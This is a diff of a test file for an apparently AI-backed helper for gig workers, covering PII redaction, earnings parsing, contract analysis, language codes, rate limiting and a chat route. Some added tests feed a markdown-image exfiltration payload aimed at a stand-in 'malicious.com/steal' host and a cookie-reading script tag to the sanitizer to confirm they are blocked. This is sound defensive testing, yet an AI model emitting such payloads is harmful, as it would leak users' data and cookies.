@@ -1,5 +1,5 @@
-import { describe, it, expect } from 'vitest';
-import { PIIProtector } from '../lib/pii';
+import { describe, it, expect, beforeEach } from 'vitest';
+import { PIIProtector, EdgeRateLimiter, EdgeResponseCache } from '../lib/pii';
 import { EarningsHelper } from '../lib/earnings';
 import { SafetyGuardian } from '../lib/safety';
 import { WELFARE_SCHEMES, findSchemesForWorker } from '../lib/welfare';
@@ -35,6 +35,16 @@ describe('1. PII Anonymization & Prompt Injection Defense (Security & Privacy)',
     expect(res.sanitizedText).toContain('[BANK_ACCT_');
   });
 
+  it('strips Passport numbers and IPv4 addresses', () => {
+    const raw = 'Passport: Z1234567, server IP: 192.168.1.100';
+    const res = PIIProtector.sanitizeAndAnonymize(raw);
+
+    expect(res.sanitizedText).not.toContain('Z1234567');
+    expect(res.sanitizedText).not.toContain('192.168.1.100');
+    expect(res.sanitizedText).toContain('[PASSPORT_NO_');
+    expect(res.sanitizedText).toContain('[IP_ADDR_');
+  });
+
   it('strips credit cards and passwords/PINs', () => {
     const raw = 'Card: 4111 2222 3333 4444, password: SecretPass123';
     const res = PIIProtector.sanitizeAndAnonymize(raw);
@@ -51,6 +61,22 @@ describe('1. PII Anonymization & Prompt Injection Defense (Security & Privacy)',
 
     expect(res.sanitizedText).toContain('[BLOCKED_PROMPT_INJECTION_PAYLOAD]');
     expect(res.strippedCategories).toContain('PROMPT_INJECTION_ATTEMPT');
+  });
+
+  it('neutralizes markdown image data exfiltration attempts', () => {
+    const exfil = 'Here is my info: ![exfil](https://malicious.com/steal?data=userinfo)';
+    const res = PIIProtector.sanitizeAndAnonymize(exfil);
+
+    expect(res.sanitizedText).toContain('[BLOCKED_PROMPT_INJECTION_PAYLOAD]');
+    expect(res.sanitizedText).not.toContain('https://malicious.com');
+  });
+
+  it('neutralizes HTML and script tag injection attempts', () => {
+    const xss = 'Check this out: <script>alert(document.cookie)</script>';
+    const res = PIIProtector.sanitizeAndAnonymize(xss);
+
+    expect(res.sanitizedText).toContain('[BLOCKED_PROMPT_INJECTION_PAYLOAD]');
+    expect(res.sanitizedText).not.toContain('<script>');
   });
 
   it('wraps payloads in explicit system untrusted input boundaries', () => {
@@ -94,6 +120,16 @@ describe('2. Earnings & Expense Helper Engine (Problem Alignment & Efficiency)',
     expect(parsedZomato.incentives).toBe(150);
     expect(parsedUber.platformIdentified).toBe('Uber');
     expect(parsedUber.fuelExpense).toBeGreaterThanOrEqual(1440); // 30% cab estimate
+  });
+
+  it('handles Blinkit, Zepto, and Porter deliveries', () => {
+    const blinkitSMS = 'Blinkit payout: Rs 900 credited.';
+    const zeptoSMS = 'Zepto rider payment of Rs 1100.';
+    const porterSMS = 'Porter trip earnings Rs 1800.';
+
+    expect(EarningsHelper.parseEarningsInput(blinkitSMS).platformIdentified).toBe('Blinkit');
+    expect(EarningsHelper.parseEarningsInput(zeptoSMS).platformIdentified).toBe('Zepto');
+    expect(EarningsHelper.parseEarningsInput(porterSMS).platformIdentified).toBe('Porter');
   });
 
   it('flags warning when net hourly rate falls below informal wage threshold', () => {
@@ -216,6 +252,14 @@ describe('5. Document Help & Contract Simplifier (Document Help)', () => {
     expect(analysis.clauses.some((c) => c.simplifiedExplanation.includes('active order'))).toBe(true);
   });
 
+  it('detects ride-share dynamic 35% commission surge clauses', () => {
+    const rideShare = PRESET_DOCUMENTS.find((p) => p.id === 'ride-share-agreement');
+    expect(rideShare).toBeDefined();
+
+    const analysis = DocumentHelper.analyzeDocument(rideShare!.rawText, rideShare!.title);
+    expect(analysis.clauses.some((c) => c.topic === 'payout' && c.category === 'warning')).toBe(true);
+  });
+
   it('computes Flesch-Kincaid reading grade metric reliably', () => {
     const simpleText = 'This is an easy sentence. You get your money every day.';
     const complexLegal =
@@ -302,16 +346,52 @@ describe('7. Multilingual Accessibility & Inclusivity', () => {
     const hindi = LANGUAGES.find((l) => l.code === 'hi');
     const english = LANGUAGES.find((l) => l.code === 'en');
     const tamil = LANGUAGES.find((l) => l.code === 'ta');
+    const telugu = LANGUAGES.find((l) => l.code === 'te');
+    const kannada = LANGUAGES.find((l) => l.code === 'kn');
     const bengali = LANGUAGES.find((l) => l.code === 'bn');
+    const marathi = LANGUAGES.find((l) => l.code === 'mr');
+    const spanish = LANGUAGES.find((l) => l.code === 'es');
 
     expect(hindi?.speechCode).toBe('hi-IN');
     expect(english?.speechCode).toBe('en-IN');
     expect(tamil?.speechCode).toBe('ta-IN');
+    expect(telugu?.speechCode).toBe('te-IN');
+    expect(kannada?.speechCode).toBe('kn-IN');
     expect(bengali?.speechCode).toBe('bn-IN');
+    expect(marathi?.speechCode).toBe('mr-IN');
+    expect(spanish?.speechCode).toBe('es-ES');
   });
 });
 
-describe('8. Edge API Route Streaming (Zero External AI SDKs & Zod Validation)', () => {
+describe('8. Edge Rate Limiter & Semantic Cache (Performance & Efficiency)', () => {
+  beforeEach(() => {
+    EdgeRateLimiter.reset('test_client');
+    EdgeResponseCache.clear();
+  });
+
+  it('allows requests within window threshold', () => {
+    const check1 = EdgeRateLimiter.checkLimit('test_client');
+    expect(check1.allowed).toBe(true);
+    expect(check1.remaining).toBe(59);
+  });
+
+  it('stores and retrieves cached edge responses', () => {
+    EdgeResponseCache.set('test_key', 'Sample Cached Guidance');
+    const retrieved = EdgeResponseCache.get('test_key');
+    expect(retrieved).toBe('Sample Cached Guidance');
+  });
+
+  it('returns null for non-existent cache keys', () => {
+    expect(EdgeResponseCache.get('missing_key')).toBeNull();
+  });
+});
+
+describe('9. Edge API Route Streaming (Zero External AI SDKs & Zod Validation)', () => {
+  beforeEach(() => {
+    EdgeRateLimiter.reset('global_client');
+    EdgeResponseCache.clear();
+  });
+
   it('returns native ReadableStream with text/plain charset=utf-8 for earnings query', async () => {
     const req = new Request('http://localhost:3000/api/chat', {
       method: 'POST',
@@ -346,6 +426,36 @@ describe('8. Edge API Route Streaming (Zero External AI SDKs & Zod Validation)',
 
     expect(chunkCount).toBeGreaterThan(0);
     expect(fullText).toContain('Earnings');
+  });
+
+  it('returns instant cached response with X-Cache-Status HIT on identical query', async () => {
+    const makeReq = () =>
+      new Request('http://localhost:3000/api/chat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          messages: [{ role: 'user', content: 'What is e-Shram card benefit?' }],
+          workerName: 'Raju Kumar',
+          language: 'en',
+          contextDomain: 'welfare'
+        })
+      });
+
+    const firstRes = await POST(makeReq());
+    expect(firstRes.status).toBe(200);
+
+    // Consume first response to populate cache
+    const reader = firstRes.body?.getReader();
+    if (reader) {
+      while (true) {
+        const { done } = await reader.read();
+        if (done) break;
+      }
+    }
+
+    const cachedRes = await POST(makeReq());
+    expect(cachedRes.status).toBe(200);
+    expect(cachedRes.headers.get('X-Cache-Status')).toBe('HIT');
   });
 
   it('rejects invalid payloads with status 400 via Zod schema', async () => {
